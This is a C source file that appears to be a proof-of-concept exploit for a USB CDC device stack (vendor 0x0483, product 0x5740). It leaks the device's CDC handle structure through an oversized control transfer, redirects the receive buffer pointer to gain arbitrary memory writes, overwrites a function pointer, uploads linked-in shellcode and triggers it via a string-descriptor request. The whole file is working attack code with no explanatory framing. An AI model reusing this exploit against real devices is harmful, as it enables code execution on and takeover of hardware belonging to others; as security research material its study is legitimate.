#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include "libusb.h"

#define VENDOR_ID      0x0483
#define PRODUCT_ID     0x5740

typedef struct
{
  uint32_t data[128];
  uint8_t  CmdOpCode;
  uint8_t  CmdLength;
  uint32_t RxBuffer;
  uint32_t TxBuffer;
  uint32_t RxLength;
  uint32_t TxLength;
  uint32_t TxState;
  uint32_t RxState;
  uint32_t Addr;
}
USBD_CDC_HandleTypeDef;

static USBD_CDC_HandleTypeDef obj;
static unsigned int hdcaddr;
static struct libusb_device_handle *devh = NULL;
static int ep_in_addr  = 0x81;
static int ep_out_addr = 0x01;
static int manufacture_func_ptr = 0x200006fc;

extern char _binary_shellcode_bin_start;
extern char _binary_shellcode_bin_end;

void write_chars(char *data, int size)
{
  int actual_length;
  if (libusb_bulk_transfer(devh, ep_out_addr, (unsigned char *)data, size, &actual_length, 0) < 0) {
    fprintf(stderr, "Error while sending chars\n");
  }
}

int read_chars(unsigned char * data, int size)
{
  int actual_length;
  int rc = libusb_bulk_transfer(devh, ep_in_addr, data, size, &actual_length, 1000);
  if (rc == LIBUSB_ERROR_TIMEOUT) {
    printf("timeout (%d)\n", actual_length);
    return -1;
  } else if (rc < 0) {
    fprintf(stderr, "Error while waiting for char\n");
    return -1;
  }
  return actual_length;
}

void wmem(unsigned int addr, char *data, int size)
{
  int rc;
  unsigned int oaddr;
  rc = libusb_control_transfer(devh, 0x80 | 0x21, 0x22, 0, 0, (unsigned char *)&obj, sizeof(obj), 1000);
  if (rc < 0) {
    fprintf(stderr, "Error during control transfer: %s\n", libusb_error_name(rc));
    return;
  }
  oaddr = obj.RxBuffer;
  obj.RxBuffer = addr;
  obj.RxState = 0;
  rc = libusb_control_transfer(devh, 0x21, 0x22, 0, 0, (unsigned char *)&obj, sizeof(obj), 1000);
  if (rc < 0) {
    fprintf(stderr, "Error during control transfer: %s\n", libusb_error_name(rc));
    return;
  }
  write_chars("t", 1);
  obj.RxBuffer = oaddr;
  rc = libusb_control_transfer(devh, 0x21, 0x22, 0, 0, (unsigned char *)&obj, sizeof(obj), 1000);
  if (rc < 0) {
    fprintf(stderr, "Error during control transfer: %s\n", libusb_error_name(rc));
    return;
  }
  write_chars(data, size);
}

void wd(unsigned int addr, unsigned int value)
{
  char buff[4];
  memcpy(buff, &value, 4);
  wmem(addr, buff, 4);
}

void leakmem(unsigned char *data, int size)
{
  int rc;
  rc = libusb_control_transfer(devh, 0x80 | 0x21, 0x22, 0, 0, data, size, 1000);
  if (rc < 0) {
    fprintf(stderr, "Error during control transfer: %s\n", libusb_error_name(rc));
    return;
  }
}

void dump(char *data, int size)
{
  FILE *fp = fopen("dump.bin", "wb");
  fwrite(data, size, 1, fp);
  fclose(fp);
}

void exec_shellcode()
{
  char buffer[0x100];
  wd(manufacture_func_ptr, hdcaddr + 0x100 + 1);
  wmem(hdcaddr + 0x100, &_binary_shellcode_bin_start, &_binary_shellcode_bin_end - &_binary_shellcode_bin_start);
  struct libusb_device_descriptor desc;
  libusb_get_device_descriptor(libusb_get_device(devh), &desc);
  libusb_get_string_descriptor_ascii(devh, desc.iManufacturer, buffer, sizeof(buffer));
}


int main(int argc, char **argv)
{
  int rc;
  rc = libusb_init(NULL);
  if (rc < 0) {
    fprintf(stderr, "Error initializing libusb: %s\n", libusb_error_name(rc));
    exit(1);
  }

  devh = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
  if (!devh) {
    fprintf(stderr, "Error finding USB device\n");
    goto out;
  }

  for (int if_num = 0; if_num < 2; if_num++) {
    if (libusb_kernel_driver_active(devh, if_num))
      libusb_detach_kernel_driver(devh, if_num);
    rc = libusb_claim_interface(devh, if_num);
    if (rc < 0) {
      fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
      goto out;
    }
  }

  libusb_control_transfer(devh, 0x80 | 0x21, 0x22, 0, 0, (unsigned char *)&obj, sizeof(obj), 1000);
  hdcaddr = obj.Addr + 8;
  printf("hdcaddr: 0x%08x\n", hdcaddr);
  exec_shellcode();

out:
  if (devh)
  {
    for (int if_num = 0; if_num < 2; if_num++) 
      libusb_attach_kernel_driver(devh, if_num);
    libusb_release_interface(devh, 0);
    libusb_close(devh);
  }
  libusb_exit(NULL);
  return rc;
}
